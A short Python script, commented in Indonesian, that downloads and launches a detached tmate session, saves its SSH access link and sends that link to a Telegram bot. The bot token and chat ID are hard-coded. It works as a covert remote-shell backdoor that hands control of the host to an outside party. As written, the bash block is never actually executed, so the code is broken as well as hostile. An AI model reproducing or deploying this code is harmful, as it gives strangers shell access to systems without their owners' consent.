#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --- KONFIG TELEGRAM ---
BOT_TOKEN = "6544141692:AAEaDh-ega9I4EqqUc6waTrrBoe2GS92vY4"
CHAT_ID   = "5077777510"

# ---------------------------------
# TIDAK ADA YANG DIUBAH DARI PERINTAH BASH
# ---------------------------------
import os
import pathlib
import requests  # pip install requests

copy = """
pkill -9 tmate
wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
tar --skip-old-files -xf tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh} -t" > tmate.txt
echo "Link tmate tersimpan di tmate.txt"
"""

# Jalankan seluruh blok bash
link = pathlib.Path("tmate.txt").read_text().strip()

# Kirim link ke Telegram
requests.post(
    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
    data={
        "chat_id": CHAT_ID,
        "text": link
    }
)
